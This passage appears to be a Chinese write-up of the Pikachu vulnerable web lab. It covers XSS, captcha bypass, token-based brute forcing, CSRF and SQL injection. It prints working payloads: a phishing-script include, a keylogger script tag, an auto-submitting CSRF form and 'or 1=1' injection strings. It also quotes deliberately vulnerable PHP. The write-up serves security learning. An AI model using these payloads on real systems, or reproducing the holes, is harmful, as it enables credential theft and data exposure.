+输入后，在点击submit后会将这段恶意代码存储到数据库中，每次都会执行这段恶意代码。即每次刷新都会弹出一个框让受害者输入用户名密码。</code></pre></div><div style="display:contents" dir="auto"><pre id="ad28db55-6aee-83f1-9795-01ab9173f181" class="code code-wrap"><code class="language-jsx" style="white-space:pre-wrap;word-break:break-all">这里有个巨坑，由于这里用的phpstudy搭建的环境，会发现一直提交授权，一直输入密码都不会将数据写入数据库。这个坑后来找到了原因：PHP 的 HTTP 认证机制仅在 PHP 以 Apache 模块方式运行时才有效，因此该功能不适用于 CGI 版本，我这里使用的是phpStudy搭建的环境，默认是以CGI版本运行PHP。后续通过重新搭建环境解决此问题。
+&lt;script src=&quot;http://127.0.0.1/Pikachu/pkxss/xfish/xfish.php?username=admin&amp;password=987654321&quot;&gt;&lt;/script&gt;
+</code></pre></div><div style="display:contents" dir="auto"><p id="ed08db55-6aee-8200-ab43-01bd2d25904d" class="">键盘记录：</p></div><div style="display:contents" dir="auto"><pre id="cab8db55-6aee-82dd-ae6a-0176c85d53dc" class="code code-wrap"><code class="language-jsx" style="white-space:pre-wrap;word-break:break-all">&lt;script src=&quot;http://127.0.0.1/pikachu/pkxss/rkeypress/rk.js&quot;&gt;&lt;/script&gt;</code></pre></div></details></li></ul></div><div style="display:contents" dir="auto"><ul id="b318db55-6aee-8218-b175-81229467742b" class="toggle"><li><details open=""><summary>XSS（DOM）</summary><div style="display:contents" dir="auto"><p id="db28db55-6aee-8284-a5fe-01c36a989a03" class="">检查代码查看源码：</p></div><div style="display:contents" dir="auto"><p id="1c18db55-6aee-828b-abe1-016bfc7fcad2" class="">&lt;a href=&#x27;&quot;+str+&quot;&#x27;&gt;what do you see?&lt;/a&gt;构造闭合：</p></div><div style="display:contents" dir="auto"><p id="7598db55-6aee-8279-a1d1-8113535eae7d" class="">&lt;a href=&#x27;<mark class="highlight-red">#&#x27; onclick=alert(111)&gt;</mark>’&gt;what do you see?&lt;/a&gt;</p></div><div style="display:contents" dir="ltr"><figure id="a018db55-6aee-8349-b6ad-015ab1f9df14" class="image"><a href="WebWriteUp/Snipaste_2025-08-14_23-38-01.png"><img style="width:805.4817504882812px" src="WebWriteUp/Snipaste_2025-08-14_23-38-01.png"/></a></figure></div><div style="display:contents" dir="auto"><p id="e4f8db55-6aee-8374-a465-81ea29f86432" class="">与上面一样</p></div></details></li></ul></div><div style="display:contents" dir="auto"><ul id="a5e8db55-6aee-8248-a928-81c93989e09c" class="toggle"><li><details open=""><summary>XSS（htmlspecialchars()）</summary><div style="display:contents" dir="auto"><p id="ec38db55-6aee-8271-8447-817a99238348" class="">htmlspecialchars() 将预定义的字符转换为HTML实体</p></div><div style="display:contents" dir="auto"><p id="36c8db55-6aee-8302-9ec3-8111f458760f" class="">预定义字符串为：</p></div><div style="display:contents" dir="auto"><p id="f538db55-6aee-8359-b0bb-81b2e10baa2b" class="">&amp; → &amp;amp   “ → &amp;quot  ‘ → &amp;#039  &lt; → &amp;lt  &gt; → &amp;gt</p></div><div style="display:contents" dir="auto"><p id="5f78db55-6aee-8231-abed-017619a71c4e" class="">可用的引号类型：</p></div><div style="display:contents" dir="auto"><p id="a128db55-6aee-8262-a442-81a7f2a9db67" class="">ENT_COMPAT : 默认，仅编码双引号</p></div><div style="display:contents" dir="auto"><p id="3288db55-6aee-83bd-babd-01eb5f2f16dd" class="">ENT_QUOTES : 编码双引号和单引号</p></div><div style="display:contents" dir="auto"><p id="ca68db55-6aee-83eb-9a58-01d906c7b1f9" class="">ENT_NOQUOTES : 不编码任何引号 </p></div><div style="display:contents" dir="auto"><p id="6958db55-6aee-820b-90da-01dd90b75c56" class="">问题代码：</p></div><div style="display:contents" dir="auto"><pre id="c3c8db55-6aee-827c-ae23-01fb1dcc2a5d" class="code code-wrap"><code class="language-php" style="white-space:pre-wrap;word-break:break-all">if(isset($_GET[&#x27;submit&#x27;])){
+    if(empty($_GET[&#x27;message&#x27;])){
+        $html.=&quot;&lt;p class=&#x27;notice&#x27;&gt;输入点啥吧！&lt;/p&gt;&quot;;
+    }else {
+        //使用了htmlspecialchars进行处理,是不是就没问题了呢,htmlspecialchars默认不对&#x27;处理
+        $message=htmlspecialchars($_GET[&#x27;message&#x27;]);
+        $html1.=&quot;&lt;p class=&#x27;notice&#x27;&gt;你的输入已经被记录:&lt;/p&gt;&quot;;
+        //输入的内容被处理后输出到了input标签的value属性里面,试试:&#x27; onclick=&#x27;alert(111)&#x27;
+//        $html2.=&quot;&lt;input class=&#x27;input&#x27; type=&#x27;text&#x27; name=&#x27;inputvalue&#x27; readonly=&#x27;readonly&#x27; value=&#x27;{$message}&#x27; style=&#x27;margin-left:120px;display:block;background-color:#c0c0c0;border-style:none;&#x27;/&gt;&quot;;
+        $html2.=&quot;&lt;a href=&#x27;{$message}&#x27;&gt;{$message}&lt;/a&gt;&quot;;
+    }
+}</code></pre></div><div style="display:contents" dir="ltr"><figure id="fd18db55-6aee-82e0-a9a3-01c74249a71c" class="image"><a href="WebWriteUp/Snipaste_2025-08-19_12-38-15.png"><img style="width:805.4752197265625px" src="WebWriteUp/Snipaste_2025-08-19_12-38-15.png"/></a></figure></div><div style="display:contents" dir="ltr"><figure id="7d98db55-6aee-8332-9ecc-013d735cc0e8" class="image"><a href="WebWriteUp/Snipaste_2025-08-19_12-39-25.png"><img style="width:805.4752197265625px" src="WebWriteUp/Snipaste_2025-08-19_12-39-25.png"/></a></figure></div><div style="display:contents" dir="ltr"><figure id="c2f8db55-6aee-837e-920a-01fb4e76d57b" class="image"><a href="WebWriteUp/Snipaste_2025-08-19_12-40-38.png"><img style="width:833.4765625px" src="WebWriteUp/Snipaste_2025-08-19_12-40-38.png"/></a></figure></div></details></li></ul></div><div style="display:contents" dir="auto"><ul id="7f58db55-6aee-83ce-ac6b-81c5a45d0a78" class="toggle"><li><details open=""><summary>XSS（herf）</summary><div style="display:contents" dir="auto"><pre id="64b8db55-6aee-83de-b118-8123521e476f" class="code code-wrap"><code class="language-php" style="white-space:pre-wrap;word-break:break-all">&lt;a href=&#x27;&#x27;&gt; 阁下自己输入的url还请自己点一下吧&lt;/a&gt;            &lt;/div&gt;</code></pre></div><div style="display:contents" dir="auto"><pre id="af98db55-6aee-83de-9d6c-81ff3ba87ece" class="code code-wrap"><code class="language-php" style="white-space:pre-wrap;word-break:break-all">if(isset($_GET[&#x27;submit&#x27;])){
+    if(empty($_GET[&#x27;message&#x27;])){
+        $html.=&quot;&lt;p class=&#x27;notice&#x27;&gt;叫你输入个url,你咋不听?&lt;/p&gt;&quot;;
+    }
+    if($_GET[&#x27;message&#x27;] == &#x27;www.baidu.com&#x27;){
+        $html.=&quot;&lt;p class=&#x27;notice&#x27;&gt;我靠,我真想不到你是这样的一个人&lt;/p&gt;&quot;;
+    }else {
+        //输出在a标签的href属性里面,可以使用javascript协议来执行js
+        //防御:只允许http,https,其次在进行htmlspecialchars处理
+        $message=htmlspecialchars($_GET[&#x27;message&#x27;],ENT_QUOTES);
+        $html.=&quot;&lt;a href=&#x27;{$message}&#x27;&gt; 阁下自己输入的url还请自己点一下吧&lt;/a&gt;&quot;;
+    }
+}</code></pre></div><div style="display:contents" dir="ltr"><figure id="a4c8db55-6aee-8252-b22b-018972338864" class="image"><a href="WebWriteUp/Snipaste_2025-08-19_12-44-39.png"><img style="width:805.4556884765625px" src="WebWriteUp/Snipaste_2025-08-19_12-44-39.png"/></a></figure></div><div style="display:contents" dir="ltr"><figure id="40e8db55-6aee-831d-a31c-81ce86924097" class="image"><a href="WebWriteUp/Snipaste_2025-08-19_12-45-32.png"><img style="width:805.4622192382812px" src="WebWriteUp/Snipaste_2025-08-19_12-45-32.png"/></a></figure></div></details></li></ul></div><div style="display:contents" dir="auto"><ul id="ada8db55-6aee-83a4-a065-812a8dcb85db" class="toggle"><li><details open=""><summary>XSS</summary><div style="display:contents" dir="auto"><pre id="a768db55-6aee-8377-be82-01e4ccb66924" class="code code-wrap"><code class="language-php" style="white-space:pre-wrap;word-break:break-all">&lt;script&gt;
+    $ms=&#x27;x&#x27;&lt;/script&gt;&lt;script&gt;alert(&#x27;xss&#x27;)&lt;/script&gt;&#x27;;
+    if($ms.length != 0){
+        if($ms == &#x27;tmac&#x27;){
+            $(&#x27;#fromjs&#x27;).text(&#x27;tmac确实厉害,看那小眼神..&#x27;)
+        }else {
+//            alert($ms);
+            $(&#x27;#fromjs&#x27;).text(&#x27;无论如何不要放弃心中所爱..&#x27;)
+        }
+
+    }
+&lt;/script&gt;</code></pre></div><div style="display:contents" dir="ltr"><figure id="4188db55-6aee-8322-b3f6-81d8dc80bad9" class="image"><a href="WebWriteUp/Snipaste_2025-08-19_12-48-17.png"><img style="width:805.4752197265625px" src="WebWriteUp/Snipaste_2025-08-19_12-48-17.png"/></a></figure></div></details></li></ul></div><div style="display:contents" dir="auto"><ul id="0678db55-6aee-839b-85d9-01c748bf7fdb" class="toggle"><li><details open=""><summary>验证码绕过(on client)</summary><div style="display:contents" dir="auto"><p id="d428db55-6aee-83fa-8a0b-015c9ff1b218" class="">1、输入错的验证码</p></div><div style="display:contents" dir="auto"><p id="06d8db55-6aee-8363-b3e9-013fafe72b6a" class="">发现是弹框提示验证码错误，那很有可能验证码验证是由前端实现的</p></div><div style="display:contents" dir="ltr"><figure id="f078db55-6aee-820b-9236-812695ae6845" class="image"><a href="WebWriteUp/Snipaste_2025-08-11_18-37-58.png"><img style="width:805.48828125px" src="WebWriteUp/Snipaste_2025-08-11_18-37-58.png"/></a></figure></div><div style="display:contents" dir="auto"><p id="b588db55-6aee-826d-8df1-815319596cc3" class="">2、查看页面源码</p></div><div style="display:contents" dir="auto"><p id="7678db55-6aee-8251-ae7c-8161ac97abe7" class="">果然发现了js代码，由于验证码验证逻辑不经过后端，所以只需要绕过前端后，拦截数据包就可以爆破用户名和密码了。</p></div><div style="display:contents" dir="ltr"><figure id="0388db55-6aee-824a-9d71-01c0c96a776e" class="image"><a href="WebWriteUp/Snipaste_2025-08-11_18-38-12.png"><img style="width:805.48828125px" src="WebWriteUp/Snipaste_2025-08-11_18-38-12.png"/></a></figure></div><div style="display:contents" dir="auto"><p id="dcd8db55-6aee-82ad-9ce7-01b760270473" class="">3、当bp拦截到数据包时候，起始就已经绕过前端了，因为数据包已经发出了，这时候，随便改动里面的vcode，发现都是回显用户名或密码错误，那么就说明验证码只是前端验证，不经过后端。</p></div><div style="display:contents" dir="ltr"><figure id="d288db55-6aee-8254-b591-0107fa8b726b" class="image"><a href="WebWriteUp/Snipaste_2025-08-11_18-12-12.png"><img style="width:805.48828125px" src="WebWriteUp/Snipaste_2025-08-11_18-12-12.png"/></a></figure></div><div style="display:contents" dir="ltr"><figure id="9648db55-6aee-822d-b4d1-011ba05f6b29" class="image"><a href="WebWriteUp/Snipaste_2025-08-11_18-37-30.png"><img style="width:805.4817504882812px" src="WebWriteUp/Snipaste_2025-08-11_18-37-30.png"/></a></figure></div><div style="display:contents" dir="auto"><p id="bca8db55-6aee-834a-abfc-013d2f9b4fdd" class="">爆破出密码</p></div></details></li></ul></div><div style="display:contents" dir="auto"><ul id="e648db55-6aee-8382-99e4-81ce21a906ff" class="toggle"><li><details open=""><summary>验证码绕过(on server)</summary><div style="display:contents" dir="auto"><p id="e648db55-6aee-8302-951d-81cc22d6c884" class="">1、随便输入验证码，看显示，都没问题</p></div><div style="display:contents" dir="ltr"><figure id="ce88db55-6aee-838a-b5a5-01433243ba5e" class="image"><a href="WebWriteUp/Snipaste_2025-08-11_18-37-30%201.png"><img style="width:2082px" src="WebWriteUp/Snipaste_2025-08-11_18-37-30%201.png"/></a></figure></div><div style="display:contents" dir="auto"><p id="5278db55-6aee-82fa-a19d-01a9524e5a98" class="">2、直接bp抓包看看</p></div><div style="display:contents" dir="auto"><p id="5ce8db55-6aee-833c-908b-8113e1b85cdf" class="">输入正确的验证码，发现可以通过，再尝试输入一些用户名和密码</p></div><div style="display:contents" dir="ltr"><figure id="3138db55-6aee-82ea-a925-01bd4a1deb98" class="image"><a href="WebWriteUp/Snipaste_2025-08-11_21-26-07.png"><img style="width:805.4817504882812px" src="WebWriteUp/Snipaste_2025-08-11_21-26-07.png"/></a></figure></div><div style="display:contents" dir="auto"><p id="7b88db55-6aee-8207-9131-012e2987144e" class="">如下图，发现验证码仍然有效，这样的话就可以在有效期内直接进行爆破了</p></div><div style="display:contents" dir="ltr"><figure id="bb28db55-6aee-82fb-9aca-81bc09cc0f3e" class="image"><a href="WebWriteUp/Snipaste_2025-08-11_21-26-26.png"><img style="width:805.4817504882812px" src="WebWriteUp/Snipaste_2025-08-11_21-26-26.png"/></a></figure></div><div style="display:contents" dir="auto"><p id="5828db55-6aee-83a3-b210-810e89c6b5c9" class="">爆破出用户名密码 admin 123456</p></div><div style="display:contents" dir="auto"><hr id="e848db55-6aee-8367-8606-812a9dae1cc7"/></div><div style="display:contents" dir="auto"><p id="a338db55-6aee-82fe-b050-81a0363709de" class="">看一看后端源码</p></div><div style="display:contents" dir="auto"><p id="0278db55-6aee-83bd-95a0-0155f94fa1a7" class="">发现图片是调用了一个showvcode.php文件生成的验证码</p></div><div style="display:contents" dir="ltr"><figure id="4918db55-6aee-8300-8278-81a979dacf82" class="image"><a href="WebWriteUp/Snipaste_2025-08-11_21-33-53.png"><img style="width:805.46875px" src="WebWriteUp/Snipaste_2025-08-11_21-33-53.png"/></a></figure></div><div style="display:contents" dir="auto"><p id="6ee8db55-6aee-8354-9502-81f064f4927f" class="">showvcode.php中，并没有给验证码设置时间限制和次数限制。</p></div><div style="display:contents" dir="ltr"><figure id="8218db55-6aee-8227-8036-817ea64f0688" class="image"><a href="WebWriteUp/Snipaste_2025-08-11_21-34-14.png"><img style="width:805.4817504882812px" src="WebWriteUp/Snipaste_2025-08-11_21-34-14.png"/></a></figure></div></details></li></ul></div><div style="display:contents" dir="auto"><ul id="6048db55-6aee-82cf-8fd7-01266708091a" class="toggle"><li><details open=""><summary>token防爆破?</summary><div style="display:contents" dir="auto"><p id="f5d8db55-6aee-82f3-910b-8157177c506a" class="">1、随便输入，是正常回显，查看源码发现了有一个隐藏的input，有token属性</p></div><div style="display:contents" dir="auto"><p id="0408db55-6aee-82ff-920e-01cae2341b65" class="">这种虽然type是hidden,只是在界面不显示，在源码中会显示，</p></div><div style="display:contents" dir="auto"><p id="1f88db55-6aee-830b-8ae4-01f31f2b159b" class="">这种一般用于客户端验证，需要向后端传递一个token值，这个值是根据上一次计算得出的，一般刷新页面后，不需要任何操作就会产生，是产生于浏览器与客户端会话之间的。</p></div><div style="display:contents" dir="ltr"><figure id="ad18db55-6aee-8327-b628-8164a544c1af" class="image"><a href="WebWriteUp/Snipaste_2025-08-11_21-50-15.png"><img style="width:805.4752197265625px" src="WebWriteUp/Snipaste_2025-08-11_21-50-15.png"/></a></figure></div><div style="display:contents" dir="auto"><p id="1c28db55-6aee-837c-94a5-8170a38f51a4" class="">为了方便，直接查看后端源码：</p></div><div style="display:contents" dir="ltr"><figure id="7908db55-6aee-838d-98c7-01eefd6a0ae6" class="image"><a href="WebWriteUp/Snipaste_2025-08-11_21-50-56.png"><img style="width:805.48828125px" src="WebWriteUp/Snipaste_2025-08-11_21-50-56.png"/></a></figure></div><div style="display:contents" dir="ltr"><figure id="5d18db55-6aee-837c-bbcb-81d1bc612875" class="image"><a href="WebWriteUp/Snipaste_2025-08-11_21-51-20.png"><img style="width:805.4752197265625px" src="WebWriteUp/Snipaste_2025-08-11_21-51-20.png"/></a></figure></div><div style="display:contents" dir="auto"><p id="2858db55-6aee-82d1-983c-019229345f4a" class="">3、既然知道每一次响应需要上一次token，那么就可以使用工具或脚本对上一次响应包中的tiken进行提取，放入下一次的请求中，形成一个递归循环，这样就可以爆破了。</p></div><div style="display:contents" dir="ltr"><figure id="8e18db55-6aee-82c8-aa5c-017fc7d89d16" class="image"><a href="WebWriteUp/v2-16bc589c219449510aa4ff96529b2fb8_r.jpg"><img style="width:805.48828125px" src="WebWriteUp/v2-16bc589c219449510aa4ff96529b2fb8_r.jpg"/></a></figure></div><div style="display:contents" dir="auto"><p id="03d8db55-6aee-8323-85c7-01ac8be1ae2e" class="">实践：</p></div><div style="display:contents" dir="ltr"><figure id="3c88db55-6aee-82bb-8ffb-01f002b17acf" class="image"><a href="WebWriteUp/Snipaste_2025-08-11_22-08-17.png"><img style="width:805.48828125px" src="WebWriteUp/Snipaste_2025-08-11_22-08-17.png"/></a></figure></div><div style="display:contents" dir="ltr"><figure id="02a8db55-6aee-832a-bf70-0126e03ded2b" class="image"><a href="WebWriteUp/Snipaste_2025-08-11_22-08-38.png"><img style="width:805.48828125px" src="WebWriteUp/Snipaste_2025-08-11_22-08-38.png"/></a></figure></div><div style="display:contents" dir="ltr"><figure id="a428db55-6aee-829c-9b29-01e442dfdedd" class="image"><a href="WebWriteUp/Snipaste_2025-08-11_22-08-04.png"><img style="width:805.48828125px" src="WebWriteUp/Snipaste_2025-08-11_22-08-04.png"/></a></figure></div><div style="display:contents" dir="ltr"><figure id="db68db55-6aee-82e8-8eac-017d6767c994" class="image"><a href="WebWriteUp/Snipaste_2025-08-11_22-07-53.png"><img style="width:805.48828125px" src="WebWriteUp/Snipaste_2025-08-11_22-07-53.png"/></a></figure></div><div style="display:contents" dir="ltr"><figure id="d668db55-6aee-82e9-9cc1-8161132ec70c" class="image"><a href="WebWriteUp/Snipaste_2025-08-11_22-07-36.png"><img style="width:805.48828125px" src="WebWriteUp/Snipaste_2025-08-11_22-07-36.png"/></a></figure></div></details></li></ul></div><div style="display:contents" dir="auto"><ul id="baa8db55-6aee-83fa-8143-81978ca728ec" class="toggle"><li><details open=""><summary>CSRF（get）</summary><div style="display:contents" dir="auto"><pre id="ee58db55-6aee-8393-9085-010670c255f2" class="code code-wrap"><code class="language-php" style="white-space:pre-wrap;word-break:break-all">抓包得到
+GET /pikachu/vul/csrf/csrfget/csrf_get_edit.php?sex=girl&amp;phonenum=12345678922&amp;add=日本&amp;email=lucy%40pikachu.com&amp;submit=submit HTTP/1.1
+
+诱导点击
+http://127.0.0.1/pikachu/vul/csrf/csrfget/csrf_get_edit.php?sex=girl&amp;phonenum=12345678922&amp;add=日本&amp;email=lucy%40pikachu.com&amp;submit=submit</code></pre></div></details></li></ul></div><div style="display:contents" dir="auto"><ul id="3248db55-6aee-8345-9239-012c0d1bdc80" class="toggle"><li><details open=""><summary>CSRF（post）</summary><div style="display:contents" dir="auto"><p id="0a58db55-6aee-8289-a2fe-81aeacdf9751" class="">写一个表单，挂到网站上，诱导点击</p></div><div style="display:contents" dir="auto"><pre id="0758db55-6aee-8297-aa5f-017ff9af56c7" class="code code-wrap"><code class="language-html" style="white-space:pre-wrap;word-break:break-all">&lt;html&gt;
+&lt;head&gt;
+&lt;script&gt;
+window.onload = function() {
+  document.getElementById(&quot;postsubmit&quot;).click();
+}
+&lt;/script&gt;
+&lt;/head&gt;
+&lt;body&gt;
+&lt;form method=&quot;post&quot; action=&quot;http://127.0.0.1/pikachu/vul/csrf/csrfpost/csrf_post_edit.php&quot;&gt;
+    &lt;input id=&quot;sex&quot; type=&quot;text&quot; name=&quot;sex&quot; value=&quot;girl&quot; /&gt;
+    &lt;input id=&quot;phonenum&quot; type=&quot;text&quot; name=&quot;phonenum&quot; value=&quot;123456789&quot; /&gt;
+    &lt;input id=&quot;add&quot; type=&quot;text&quot; name=&quot;add&quot; value=&quot;hubei&quot; /&gt;
+    &lt;input id=&quot;email&quot; type=&quot;text&quot; name=&quot;email&quot; value=&quot;lucy@163.com&quot; /&gt;
+    &lt;input id=&quot;postsubmit&quot; type=&quot;submit&quot; name=&quot;submit&quot; value=&quot;submit&quot; /&gt;
+&lt;/form&gt;
+&lt;/body&gt;
+&lt;/html&gt;
+</code></pre></div></details></li></ul></div><div style="display:contents" dir="auto"><ul id="bb18db55-6aee-8370-a838-0150db7aba4c" class="toggle"><li><details open=""><summary>CSRF（token）</summary><div style="display:contents" dir="auto"><p id="fe28db55-6aee-834e-90cc-810d545f6a6b" class="">token是一个随机码</p></div><div style="display:contents" dir="auto"><p id="c678db55-6aee-8243-8a25-818ca6b5c258" class="">攻击者不能用自己的token进行攻击</p></div><div style="display:contents" dir="auto"><pre id="e1b8db55-6aee-83a6-b239-0196986df87d" class="code code-wrap"><code class="language-html" style="white-space:pre-wrap;word-break:break-all">抓包得到
+GET /pikachu/vul/csrf/csrftoken/token_get_edit.php?sex=girl&amp;phonenum=12345678922&amp;add=%E7%BE%8E%E5%9B%BD&amp;email=lucy%40pikachu.com&amp;token=4971968a411732dea3587173149&amp;submit=submit HTTP/1.1
+token=4971968a411732dea3587173149</code></pre></div></details></li></ul></div><div style="display:contents" dir="auto"><ul id="f2d8db55-6aee-8384-86b6-814dfab780c4" class="toggle"><li><details open=""><summary>简单的sql测试</summary><div style="display:contents" dir="auto"><pre id="21e8db55-6aee-82e3-ba20-014570943f80" class="code code-wrap"><code class="language-makefile" style="white-space:pre-wrap;word-break:break-all">aaa&#x27; or 1=1 #
+aaa&quot; or 1=1 #
+aaa&quot;) or 1=1 #
+aaa&#x27; and 1=1 #
+aaa&#x27; and 1=2 #
+特殊符号看会不会报错
+&#x27;
+&quot;
+)
+%
+...</code></pre></div></details></li></ul></div><div style="display:contents" dir="auto"><ul id="a5a8db55-6aee-82d6-be5a-815fb810448a" class="toggle"><li><details open=""><summary>SQL（数字post）</summary><div style="display:contents" dir="auto"><p id="59b8db55-6aee-8315-8db0-010addd73284" class="">猜想后台逻辑</p></div><div style="display:contents" dir="auto"><pre id="98c8db55-6aee-837c-9ae2-010ebe0c7a1e" class="code code-wrap"><code class="language-html" style="white-space:pre-wrap;word-break:break-all">$id = $_POST[&#x27;id&#x27;]
+
+select 字段1， 字段2 from 表 where id = $id
+select 字段1， 字段2 from 表 where id = 1 or 1=1  -- 输出数据库表中所有内容</code></pre></div><div style="display:contents" dir="auto"><pre id="d598db55-6aee-82f4-b5af-81bf221a2d9b" class="code code-wrap"><code class="language-php" style="white-space:pre-wrap;word-break:break-all">if(isset($_POST[&#x27;submit&#x27;]) &amp;&amp; $_POST[&#x27;id&#x27;]!=null){
+    //这里没有做任何处理，直接拼到select里面去了,形成Sql注入
+    $id=$_POST[&#x27;id&#x27;];
+    $query=&quot;select username,email from member where id=$id&quot;;
+    $result=execute($link, $query);
+    //这里如果用==1,会严格一点
+    if(mysqli_num_rows($result)&gt;=1){
+        while($data=mysqli_fetch_assoc($result)){
+            $username=$data[&#x27;username&#x27;];
+            $email=$data[&#x27;email&#x27;];
+            $html.=&quot;&lt;p class=&#x27;notice&#x27;&gt;hello,{$username} &lt;br /&gt;your email is: {$email}&lt;/p&gt;&quot;;
+        }
+    }else{
+        $html.=&quot;&lt;p class=&#x27;notice&#x27;&gt;您输入的user id不存在，请重新输入！&lt;/p&gt;&quot;;
+    }
+}</code></pre></div><div style="display:contents" dir="ltr"><figure id="e238db55-6aee-8369-a9b4-81b701f0e500" class="image"><a href="WebWriteUp/Snipaste_2025-08-19_14-48-37.png"><img style="width:805.4817504882812px" src="WebWriteUp/Snipaste_2025-08-19_14-48-37.png"/></a></figure></div><div style="display:contents" dir="ltr"><figure id="9618db55-6aee-83b4-9735-01485a0c37fa" class="image"><a href="WebWriteUp/Snipaste_2025-08-19_14-53-09.png"><img style="width:805.4752197265625px" src="WebWriteUp/Snipaste_2025-08-19_14-53-09.png"/></a></figure></div></details></li></ul></div><div style="display:contents" dir="auto"><ul id="4208db55-6aee-836a-8bb2-01ec4edde5a8" class="toggle"><li><details open=""><summary>SQL（字符get）</summary><div style="display:contents" dir="auto"><p id="61f8db55-6aee-82d5-a656-818683e0c9f6" class="">猜想后台逻辑</p></div><div style="display:contents" dir="auto"><pre id="a628db55-6aee-83a8-ae19-01972c293e35" class="code code-wrap"><code class="language-php" style="white-space:pre-wrap;word-break:break-all">select 字段1， 字段2 from 表 where username=&#x27;kb&#x27; --字符串需要单引号，因此构造闭合单引号
+select 字段1， 字段2 from 表 where username=&#x27;kb&#x27; or 1=1 --+&#x27; -- --+是注释+为空格
+最后的--+注释可能会失败，换成-- ，# 多尝试几次
+kb&#x27; or 1=1 #</code></pre></div><div style="display:contents" dir="auto"><pre id="6ba8db55-6aee-82ad-a770-0184c8353d47" class="code code-wrap"><code class="language-php" style="white-space:pre-wrap;word-break:break-all">if(isset($_GET[&#x27;submit&#x27;]) &amp;&amp; $_GET[&#x27;name&#x27;]!=null){
+    //这里没有做任何处理，直接拼到select里面去了
+    $name=$_GET[&#x27;name&#x27;];
+    //这里的变量是字符型，需要考虑闭合
+    $query=&quot;select id,email from member where username=&#x27;$name&#x27;&quot;;
+    $result=execute($link, $query);
+    if(mysqli_num_rows($result)&gt;=1){
+        while($data=mysqli_fetch_assoc($result)){
+            $id=$data[&#x27;id&#x27;];
+            $email=$data[&#x27;email&#x27;];
+            $html.=&quot;&lt;p class=&#x27;notice&#x27;&gt;your uid:{$id} &lt;br /&gt;your email is: {$email}&lt;/p&gt;&quot;;
+        }
+    }else{
+
+        $html.=&quot;&lt;p class=&#x27;notice&#x27;&gt;您输入的username不存在，请重新输入！&lt;/p&gt;&quot;;
+    }
+}</code></pre></div><div style="display:contents" dir="ltr"><figure id="a8f8db55-6aee-83ae-84bf-81d091e48d29" class="image"><a href="WebWriteUp/Snipaste_2025-08-19_15-04-08.png"><img style="width:805.4817504882812px" src="WebWriteUp/Snipaste_2025-08-19_15-04-08.png"/></a></figure></div></details></li></ul></div><div style="display:contents" dir="auto"><ul id="b998db55-6aee-83c8-9dc9-816b22abbe99" class="toggle"><li><details open=""><summary>SQL（搜索）</summary><div style="display:contents" dir="auto"><pre id="68d8db55-6aee-8331-8d44-817f7a24bb32" class="code code-wrap"><code class="language-php" style="white-space:pre-wrap;word-break:break-all">数据库中搜索使用like
+select * from member where username like &#x27;%k%&#x27;;
+&#x27;%k%&#x27;为包含看的username都会被搜索出来
+select * from member where username like &#x27;%xxxx%&#x27; or 1=1 #%&#x27;
+</code></pre></div><div style="display:contents" dir="auto"><pre id="e468db55-6aee-8262-939f-81772f84cf6d" class="code code-wrap"><code class="language-php" style="white-space:pre-wrap;word-break:break-all">if(isset($_GET[&#x27;submit&#x27;]) &amp;&amp; $_GET[&#x27;name&#x27;]!=null){
+
+    //这里没有做任何处理，直接拼到select里面去了
+    $name=$_GET[&#x27;name&#x27;];
+
+    //这里的变量是模糊匹配，需要考虑闭合
+    $query=&quot;select username,id,email from member where username like &#x27;%$name%&#x27;&quot;;
+    $result=execute($link, $query);
+    if(mysqli_num_rows($result)&gt;=1){
+        //彩蛋:这里还有个xss
+        $html2.=&quot;&lt;p class=&#x27;notice&#x27;&gt;用户名中含有{$_GET[&#x27;name&#x27;]}的结果如下：&lt;br /&gt;&quot;;
+        while($data=mysqli_fetch_assoc($result)){
+            $uname=$data[&#x27;username&#x27;];
+            $id=$data[&#x27;id&#x27;];
+            $email=$data[&#x27;email&#x27;];
+            $html1.=&quot;&lt;p class=&#x27;notice&#x27;&gt;username：{$uname}&lt;br /&gt;uid:{$id} &lt;br /&gt;email is: {$email}&lt;/p&gt;&quot;;
+        }
+    }else{
+
+        $html1.=&quot;&lt;p class=&#x27;notice&#x27;&gt;0o。..没有搜索到你输入的信息！&lt;/p&gt;&quot;;
+    }
+}</code></pre></div><div style="display:contents" dir="ltr"><figure id="14e8db55-6aee-82a1-8524-01a3d0cbcec5" class="image"><a href="WebWriteUp/Snipaste_2025-08-19_15-09-23.png"><img style="width:805.48828125px" src="WebWriteUp/Snipaste_2025-08-19_15-09-23.png"/></a></figure></div></details></li></ul></div><div style="display:contents" dir="auto"><ul id="bcd8db55-6aee-8312-bfac-010fb892a65c" class="toggle"><li><details open=""><summary>SQL（xx）</summary><div style="display:contents" dir="auto"><pre id="1968db55-6aee-83f1-a813-811e8d60e947" class="code code-wrap"><code class="language-php" style="white-space:pre-wrap;word-break:break-all">&quot;select id,email from member where username=(&#x27;xxx&#x27;) or 1=1 #&#x27;)&quot;</code></pre></div><div style="display:contents" dir="auto"><pre id="af48db55-6aee-8321-8dd5-0128fc17dfcc" class="code code-wrap"><code class="language-php" style="white-space:pre-wrap;word-break:break-all">if(isset($_GET[&#x27;submit&#x27;]) &amp;&amp; $_GET[&#x27;name&#x27;]!=null){
+    //这里没有做任何处理，直接拼到select里面去了
+    $name=$_GET[&#x27;name&#x27;];
+    //这里的变量是字符型，需要考虑闭合
+    $query=&quot;select id,email from member where username=(&#x27;$name&#x27;)&quot;;
+    $result=execute($link, $query);
+    if(mysqli_num_rows($result)&gt;=1){
+        while($data=mysqli_fetch_assoc($result)){
+            $id=$data[&#x27;id&#x27;];
+            $email=$data[&#x27;email&#x27;];
+            $html.=&quot;&lt;p class=&#x27;notice&#x27;&gt;your uid:{$id} &lt;br /&gt;your email is: {$email}&lt;/p&gt;&quot;;
+        }
+    }else{
+
+        $html.=&quot;&lt;p class=&#x27;notice&#x27;&gt;您输入的username不存在，请重新输入！&lt;/p&gt;&quot;;
+    }
